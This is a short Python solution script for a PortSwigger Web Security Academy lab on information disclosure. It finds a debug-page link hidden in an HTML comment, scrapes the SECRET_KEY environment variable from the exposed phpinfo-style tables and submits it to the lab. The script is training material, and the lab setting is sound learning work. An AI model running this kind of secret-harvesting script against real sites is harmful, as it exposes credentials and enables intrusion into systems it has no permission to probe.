#!/usr/bin/env python


'''This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable.

Lab link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page
'''

import requests
from bs4 import BeautifulSoup, Comment
import pandas


lab_id = '0a2900a503eb9b6a83abf0dd003a00aa' #change based on generated lab


def page_extract(resp): # function for parsing info needed from the source code
    # First extract the actual comment with the link we need
    soup = BeautifulSoup(resp, 'lxml')
    comments = soup.find_all(string=lambda string:isinstance(string, Comment))
    # Then extract the link iself and return it
    soup_2 = BeautifulSoup(comments[0], 'lxml')
    links = [link.get('href') for link in soup_2.find_all('a')]
    return links[0]


def main():
    # The debug page is hidden in the html source. Let's extract it
    uri = f"https://{lab_id}.web-security-academy.net"
    r = requests.get(uri)
    debug_link = page_extract(r.text)
    
    # Once we have that, navigate to that page
    r2 = requests.get(uri + debug_link)
    # Use pandas to extract the php info tables from the html source. Streamline this by only getting the table that 
    # has the SECRET_KEY value
    data = pandas.read_html(r2.text, match='SECRET_KEY')
    # In order to get the actual secret key value, we covert the data frame that resulted from the above query to a dictonary
    # Then we pull the SECRET_KEY value using the appropriate dict keys.
    secret_key = data[0].to_dict()['Value'][4]

    # Now post the SECRET_KEY to finish the lab
    uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
    data = { 'answer' : secret_key }
    r3 = requests.post(uri, data=data)
    print('finished')


if __name__ == '__main__':
    main()